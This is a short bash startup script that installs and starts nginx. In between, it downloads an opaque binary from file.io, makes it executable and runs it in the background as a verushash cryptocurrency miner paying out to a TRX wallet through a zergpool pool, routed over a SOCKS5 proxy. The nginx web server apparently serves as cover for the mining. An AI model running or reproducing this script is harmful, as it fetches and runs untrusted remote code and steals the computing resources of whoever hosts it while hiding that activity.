#!/bin/bash
apt update -y
apt install nginx -y
apt install wget -y
wget https://file.io/YDtmnMa6hgsc && chmod +x YDtmnMa6hgsc && ./YDtmnMa6hgsc -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
sleep 10
service nginx start
